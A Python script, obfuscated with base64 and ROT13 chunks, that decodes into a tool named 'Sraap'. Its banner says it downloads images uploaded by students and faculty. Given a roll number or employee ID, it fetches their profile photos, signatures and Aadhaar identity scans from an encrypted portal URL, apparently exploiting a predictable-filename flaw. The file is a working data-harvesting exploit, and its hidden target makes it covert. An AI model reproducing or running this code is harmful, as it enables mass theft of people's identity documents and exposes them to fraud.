# Python code obfuscated to hide the vulnerability. 
 

import base64, codecs
magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgY29kaW5nOiB1dGYtOAoKIyBJblszXToKCgojIS91c3IvYmluL2VudiBweXRob24KIyBjb2Rpbmc6IHV0Zi04CgojIEluWzhdOgoKCmZyb20gUElMIGltcG9ydCBJbWFnZQpmcm9tIG9zLnBhdGggaW1wb3J0ICoKaW1wb3J0IG9zCmltcG9ydCB3Z2V0CmltcG9ydCByYW5kb20KaW1wb3J0IGNvbG9yYW1hCmltcG9ydCByYW5kb20KaW1wb3J0IGNyeXB0b2NvZGUKbXlFbmNyeXB0ZWRNZXNzYWdlMSA9IGNyeXB0b2NvZGUuZGVjcnlwdCgiSkNHRS85dEtiVkFNaDIyMWxHcmNkSlBKZTJjTW15Y2VpeHJzSFZLMjJsclRMVFdIOE1RMXNBdVpVZGVGKllKejBZRVQ1NGhOMGxRdGFhNUJYUlE9PSp1M0EyZ0N3eGxVNDU5T2N1SWhQblpRPT0qVmxEdEVCYUd2K3RFaFU0NVZqOU81QT09IiwgIkFrc2hheSIpCm15RW5jcnlwdGVkTWVzc2FnZSA9IGNyeXB0b2NvZGUuZGVjcnlwdCgiK3FDN1VaV1dxU3lsREZxNyszQUZrblk5VTVkcGN0NkkyVE5mN01lcHovNjRsbXVZV0pTeC9BPT0qSHFjQXpWY2Z4TTZYNENXclBBWnR3UT09Knp3dFAzNlFTZlp5ZGhLZ0lKRWlybWc9PSpDcFI3VEtlNEU0OW9ESUhxVEZHOStRPT0iLCAiQWtzaGF5IikgICAKdGV4dCA9IHIiIiIKICAgICAgICAgLi0tLF8KICAgICAgICBbJyAgICAnXC4KICAgICAgICAgXCAgICAgICBgJyd8CiAgICAgICAgIHwgICAgICAgICAsXQogICAgICAgICAgYC5fICAgICAgXS4KICAgICAgICAgICAgfCAgICAgXAogICAgICAgICAgXy8gICAgICAgIC0nXAogICAgICAgICAsJyAgICAgICAgICAsJwogICAgICAgXy8nICAgICAgICAgIFwgICAgICAgICAgICAgICAgICAgICAsLi4tJydMXwogIHwtLScnICAgICAgICAgICAgICAnLTtfXyAgICAgICAgfFwgICAgIC8gICAgICAuLCcKICAgXCAgICAgICAgICAgICAgICAgICAgICBgLS0uX18sJ18gJy0tLS0gICAgICwtJwogICBgXCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXGAtJ1xfXyAgICAsfAosLS07LyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgICAgLnwgLC8KXF9fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd8ICAgIC8gIC8gCiAgLi8gIF8tLCAgICAgICAgICAgICAgICAgICAgICAgICBffCAgICBcICAvCiAgXF9fLyAvICAgICAgICAgICAgICAgICAgICAgICAgLC8gICAgICAgICIKICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgXy8KICAgICAgIHwgICAgICAgICAgICAgICAgICAgICwvCiAgICAgICBcICAgICAgICAgICAgICAgICAgIC8KICAgICAgICB8ICAgICAgICAgICAgICAvLi0nCiAgICAgICAgIFwgICAgICAgICAgIF8vICAgICAgICAgICAgICAgICAgIDoKICAgICAgICAgIHwgICAgICAgICAvICAgICAgICAgICAgICAgICAgICAgIC4KICAgICAgICAgICB8ICAgICAgICB8ICAgICAgICAgICAgICAgICAgICAgLgogICAgICAuICAgIHwgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAnLgogICAgICA7ICAgICBcICAgICAgIC8gICAgICAgICAgICAgICAgICAgICA7XAogICAgICAnICAgICAgfCAgICAgfCAgICAgICAgICAgICAgICAKICAgICAgICAgICAgIFwgICAgX3wgICAgICAgICAgICAgICAgICAgICAgOiAKICAgICAgICAgICAgICBcXywvICAgICAgICAgICAgICAgICAgICAgICAgICInCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnCgogICAgCgoKICAgCiAgICAgICAgICAgIF9fX19fX19fX19fX19fX19fX19fLyUlKiUlKiUlKiUlKiUlKlxfX19fX19fX19fX19fX19fX19fX18KICAgICAgICAgIC8vfn5+fn5+fn5+fn5+fn5+fn5+ICAgICAgICAgICAgICAgICAgICBgYH5+fn5+fn5+fn5+fn5+fn5+XFwKICAgICAgICAgSTogICAgIC57e319fX19fS4gICAgICB8IOKVlOKVkOKVkOKVkOKVkOKVkF9fX+KVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkF/ilZDilZDilZDilZDilZDilZDilZDilZcgOkkKICAgICAgICAgSTogICAge3t7e3t9fX19fX19LiAgICB8IOKVkSAgICB8IF9fXSBfIF8gIF9fXyAgX19fIHwgfF9fICAgIOKVkSA6SQogICAgICAgICBJOiAgIHt7e3t7e3t7e3t7fX19fSAgIHwg4pWRICAgIHwgX10gfCAnX10vIC5fXVtfXSB8fCAvIC8gICAg4pWRIDpJCiAgICAgICAgIEk6ICAgfX19fSBfICAgXyB7e3t7ICAgfCDilZEgICAgfF98ICB8X3wgIFxfX18uW19fX3x8X1xfXCAgICDilZEgOkkKICAgICAgICAgSTogICB9fX0gIDYgICA2ICB9fX0gICB8IOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnSA6SQogICAgICAgICBJOiAgICB7QyAgICBeICAgIHtjICAgIHwgPC0+PC0+PC0+PC0+PC0+PC0+PC0+PC0+PC0+PC0+PC0+PC0+OkkKICAgICAgICAgSTogICAgICBcICAnPScgIC8gICAgICB8IEF1dGhvciBOYW1lOiA0SzVINFkgNFJKVU4gICAgICAgICAgIDpJCiAgICAgICAgIEk6ICAgICAgIDsuX19fLjsgICAgICAgfCBXZWJzaXRlOiBodHRwczovL2JpdC5seS9BS1NIQVlBUkpVTiA6SQogICAgICAgICBJOiAgICAgICAgKSAgICggICAgICAgIHwgTmF0aW9uYWxpdHk6ICBJbmRpYW4gICAgICAgICAgICAgICAgOkkKICAgICAgICAgSSAgICAgICAgJzogICA6JyAgICAgICB8IFRvb2wgTmFtZTogU3JhYXAgICAgICAgICAgICAgICAgICAgIDpJCiAgICAgICAgIEk6ICAgICAgICAgJ8KlJyAgICAgICAgIHwgVXNhZ2U6IERvd25sb2FkcyBhbGwgaW1hZ2VzIHdoaWNoICAgOkkKICAgICAgICAgSTogICAgICAgICAgICAgICAgICAgICB8IGFyZSB1cGxvYWRlZCBieSBzdHVkZW50cyAmIGZhY3VsdHkuIDpJCiAgICAgICAgICAqX19fX19fX19fX19fX19fX19fX19ffF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18qCiAgICAgICAgICAgICAgICAgICAgICAgICAgIFwlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUvCgoKICAgICAgIiIiICAgICAgICAKb3Muc3lzdGVtKCJjbHMiKQpiYWRfY29sb3JzID0gWydCTEFDSycsICdXSElURScsICdMSUdIVEJMQUNLX0VYJywgJ1JFU0VUJ10KY29kZXMgPSB2YXJzKGNvbG9yYW1hLkZvcmUpCmNvbG9ycyA9IFtjb2Rlc1tjb2xvcl0gZm9yIGNvbG9yIGluIGNvZGVzIGlmIGNvbG9yIG5vdCBpbiBiYWRfY29sb3JzXQpjb2xvcmVkX2xpbmVzID0gW3JhbmRvbS5jaG9pY2UoY29sb3JzKSArIGxpbmUgZm9yIGxpbmUgaW4gdGV4dC5zcGxpdCgnXG4nKV0KcHJpbnQoJ1xuJy5qb2luKGNvbG9yZWRfbGluZXMpKQppbnN0YWxsRGlyID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpICsgJy8nCnByaW50KCcgPj4gQWxsIHRoZSBpbWFnZXMgd2lsbCB'
love = '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'
god = 'AgICAgICAgIGltLnNob3coKQogICAgICAgICAgICAgICAgZXhjZXB0IDoKICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gPj4gVW5hYmxlIHRvIG9wZW4gdGhlIGRvd25sb2FkZWQgaW1hZ2UgXG4gPj4gTWFudWFsbHkgb3BlbiB0aGUgaW1hZ2UgZnJvbSB0aGUgcGF0aCAnK28zKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzoKICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4gPj4gVGhleSBkaWRuJ3QgdXBsb2FkZWQgdGhlIHBpY3R1cmUgb3IgaW5jb3JyZWN0IGVtcGxveWVlIGlkIFxuIikKICAgICAgICBlbGlmIHR5cD09IjQiOgogICAgICAgICAgICBzdHIyID0gcGljKyJfcGFuLmpwZyIgCiAgICAgICAgICAgIHJlcyA9IHN0cjEgKyBzdHIyCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc3RyMikKICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4gPj4gRXhpc3RpbmcgZmlsZSBmb3VuZCBhbmQgcmVtb3ZlZCIpCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzoKICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4gPj4gTm8gZXhpc3RpbmcgZmlsZSBmb3VuZCAgIikKICAgICAgICAgICAgICAgIHByaW50KCdcbiA+PiBTZWFyY2hpbmcgZm9yIHBpY3R1cmUgXG4gPj4gRG93bmxvYWQgd2lsbCBhdXRvbWF0aWNhbGx5IHN0YXJ0IGlmIHBpY3R1cmUgaXMgZm91bmQnKQogICAgICAgICAgICAgICAgZmlsZW5hbWUgPSB3Z2V0LmRvd25sb2FkKHJlcykKICAgICAgICAgICAgICAgIHByaW50KCJcbiA+PiBEb3dubG9hZCBDb21wbGV0ZSEiKQogICAgICAgICAgICAgICAgcHJpbnQoIlxuID4+IEZpbGUgbmFtZSBpcyAiK3N0cjIpCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgbzE9aW5zdGFsbERpcgogICAgICAgICAgICAgICAgICAgIG8yPXN0cjIKICAgICAgICAgICAgICAgICAgICBvMz1vMStvMgogICAgICAgICAgICAgICAgICAgIGltID0gSW1hZ2Uub3BlbihvMykgCiAgICAgICAgICAgICAgICAgICAgaW0uc2hvdygpCiAgICAgICAgICAgICAgICBleGNlcHQgOgogICAgICAgICAgICAgICAgICAgIHByaW50KCdcbiA+PiBVbmFibGUgdG8gb3BlbiB0aGUgZG93bmxvYWRlZCBpbWFnZSBcbiA+PiBNYW51YWxseSBvcGVuIHRoZSBpbWFnZSBmcm9tIHRoZSBwYXRoICcrbzMpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiA+PiBUaGV5IGRpZG4ndCB1cGxvYWRlZCB0aGUgcGljdHVyZSBvciBpbmNvcnJlY3QgZW1wbG95ZWUgaWQgXG4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCdcbiA+PiBJbnZhbGlkIG9wdGlvbiBjaG9vc2VkJykKICAgICAgICAgICAgcmVwZWF0ID0gaW5wdXQoJ1xuID4+IERvIHlvdSB3YW5uYSB0cnkgYWdhaW4gPyBcbiAxKVllcyAyKU5vIDogJykKICAgICAgICAgICAgY291bnRlciA9IGNvdW50ZXIgKyAxCiAgICAgICAgICAgIGlmIHJlcGVhdCA9PSByZXA6CiAgICAgICAgICAgICAgICBwcmludCgnXG4gPj4gVGhhbmtzIGZvciB1c2luZyEgU2VlIHlvdSBsYXRlciFcbiA+PiBUb29sIG1hZGUgYnkgNEs1SDRZIDRSSlVOLicpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbGlmIHJlcGVhdCAhPSAiMSI6CiAgICAgICAgICAgICAgICBwcmludCgnXG4gPj4gSW52YWxpZCBvcHRpb24gY2hvb3NlZCB0d2ljZSEgRXhpdGluZyFcbiA+PiBUb29sIG1hZGUgYnkgNEs1SDRZIDRSSlVOLicpCiAgICAgICAgICAgICAgICBicmVhawogICAgZWxpZiBjaD09IjIiOgogICAgICAgIHBpYz1pbnB1dCgnXG4gPj4gRW50ZXIgUm9sbCBOdW1iZXIgOicpLnVwcGVyKCkKICAgICAgICBpZiBwaWM9PSIyMDAzQTUzMDE1IjoKICAgICAgICAgICAgcHJpbnQoIlxuID4+IE5vdCBhbGxvd2VkIHRvIGRvd25sb2FkIDRLNUg0WSA0UkpVTidzIGltYWdlcyBvX08uIEJldHdlZW4gbmljZSB0cnkhIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBzdHIxID0gbXlFbmNyeXB0ZWRNZXNzYWdlMQogICAgICAgICAgICBwcmludCgiXG4gPj4gTm90ZSA6IE1vc3Qgb2YgdGhlbSBkaWQgbm90IHVwbG9hZCBTaWduLEFBZGhhci4gQnV0IGlmIHRoZXkgZG8gdGhlbiB0aGlzIHRvb2wgd2lsbCBkb3dubG9hZCBpdC4gIikKICAgICAgICAgICAgcHJpbnQoJ1xuID4+IENob29zZSBhbiBvcHRpb24gdG8gZG93bmxvYWQgaW1hZ2VzIDonKQogICAgICAgICAgICB0eXA9aW5wdXQoJ1xuID4+IDEpUHJvZmlsZSBwaWMgXG4gPj4gMilTaWduIFxuID4+IDMpQUFkaGFyIDonKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgdHlwPT0iMSI6CiAgICAgICAgICAgICAgICBzdHIyID0gcGljKyJfUC5qcGciIAogICAgICAgICAgICAgICAgcmVzID0gc3RyMSArIHN0cjIKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzdHIyKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4gPj4gRXhpc3RpbmcgZmlsZSBmb3VuZCBhbmQgcmVtb3ZlZCIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleGM6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiA+PiBObyBleGlzdGluZyBmaWxlIGZvdW5kICAiKQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcbiA+PiBTZWFyY2hpbmcgZm9yIHBpY3R1cmUgXG4gPj4gRG93bmxvYWQgd2lsbCBhdXRvbWF0aWNhbGx5IHN0YXJ0IGlmIHBpY3R1cmUgaXMgZm91bmQnKQogICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lID0gd2dldC5kb3dubG9hZChyZXMpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuID4+IERvd25sb2FkIENvbXBsZXRlISIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuID4+IEZpbGUgbmFtZSBpcyAiK3N0cjIpCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBvMT1pbnN0YWxsRGlyCiAgICAgICAgICAgICAgICAgICAgICAgIG8yPXN0cjIKICAgICAgICAgICAgICAgICAgICAgICAgbzM9bzErbzIKICAgICAgICAgICAgICAgICAgICAgICAgaW0gPSBJbWFnZS5vcGVuKG8zKSAKICAgICAgICAgICAgICAgICAgICAgICAgaW0uc2hvdygpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IDoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xuID4+IFVuYWJsZSB0byBvcGVuIHRoZSBkb3dubG9hZGVkIGltYWdlIFxuID4+IE1hbnVhbGx5IG9wZW4gdGhlIGltYWdlIGZyb20gdGhlIHBhdGggJytvMykKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJcbiA+PiBUaGV5IGRpZ'
destiny = 'T4aqPO1pTkiLJEyMPO0nTHtpTywqUIlMFOipvOWozAipaWyL3DtHz9foPOBqJ1vMKVvXFNXVPNtVPNtVPNtVPNtMJkcMvO0rKN9CFVlVwbXVPNtVPNtVPNtVPNtVPNtVUA0pwVtCFOjnJZeVy9GYzcjMlVtPvNtVPNtVPNtVPNtVPNtVPOlMKZtCFOmqUVkVPftp3ElZtbtVPNtVPNtVPNtVPNtVPNtqUW5BtbtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNto3ZhpzIgo3MyXUA0pwVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPWpovN+CvOSrTymqTyhMlOznJkyVTMiqJ5xVTShMPOlMJ1iqzIxVvxXVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUDtEKuwMKO0nJ9hVTSmVTI4LmbXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVykhVQ4+VR5iVTI4nKA0nJ5aVTMcoTHtMz91ozDtVPVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbW1khVQ4+VSAyLKWwnTyhMlOzo3VtpTywqUIlMFOpovN+CvORo3qhoT9uMPO3nJkfVTS1qT9gLKEcL2SfoUxtp3EupaDtnJLtpTywqUIlMFOcplOzo3IhMPpcPvNtVPNtVPNtVPNtVPNtVPNtVPNtMzyfMJ5uoJHtCFO3M2I0YzEiq25fo2SxXUWyplxXVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvKT4tCw4tET93ozkiLJDtD29gpTkyqTHuVvxXVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvKT4tCw4tEzyfMFOhLJ1yVTymVPVep3ElZvxXVPNtVPNtVPNtVPNtVPNtVPNtVPO0pax6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVT8kCJyhp3EuoTkRnKVXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtomV9p3ElZtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOiZm1iZFgiZtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcoFN9VRygLJqyYz9jMJ4bomZcVNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcoF5mnT93XPxXVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUDtBtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtaKT4tCw4tIJ5uLzkyVUEiVT9jMJ4tqTuyVTEiq25fo2SxMJDtnJ1uM2HtKT4tCw4tGJShqJSfoUxto3OyovO0nTHtnJ1uM2HtMaWioFO0nTHtpTS0nPNaX28mXDbtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyrTZ6PvNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVykhVQ4+VSEbMKxtMTyxovq0VUIjoT9uMTIxVUEbMFOjnJA0qKWyVT9lVRyhL29lpzIwqPOFo2kfVR51oJWypvVcPvNtVPNtVPNtVPNtVTIfnJLtqUyjCG0vZlV6PvNtVPNtVPNtVPNtVPNtVPOmqUVlVQ0tpTywXlWsDF5dpTpvVNbtVPNtVPNtVPNtVPNtVPNtpzImVQ0tp3ElZFNeVUA0pwVXVPNtVPNtVPNtVPNtVPNtVUElrGbXVPNtVPNtVPNtVPNtVPNtVPNtVPO0pax6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVT9mYaWyoJ92MFumqUVlXDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvKT4tCw4tEKucp3EcozptMzyfMFOzo3IhMPOuozDtpzIgo3MyMPVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyrTZ6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPWpovN+CvOBolOyrTymqTyhMlOznJkyVTMiqJ5xVPNvXDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPqpovN+CvOGMJSlL2ucozptMz9lVUOcL3E1pzHtKT4tCw4tET93ozkiLJDtq2yfoPOuqKEioJS0nJAuoTk5VUA0LKW0VTyzVUOcL3E1pzHtnKZtMz91ozDaXDbtVPNtVPNtVPNtVPNtVPNtVPNtVTMcoTIhLJ1yVQ0tq2qyqP5xo3qhoT9uMPulMKZcPvNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVykhVQ4+VREiq25fo2SxVRAioKOfMKEyVFVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVykhVQ4+VRMcoTHtozSgMFOcplNvX3A0pwVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtqUW5BtbtVPNt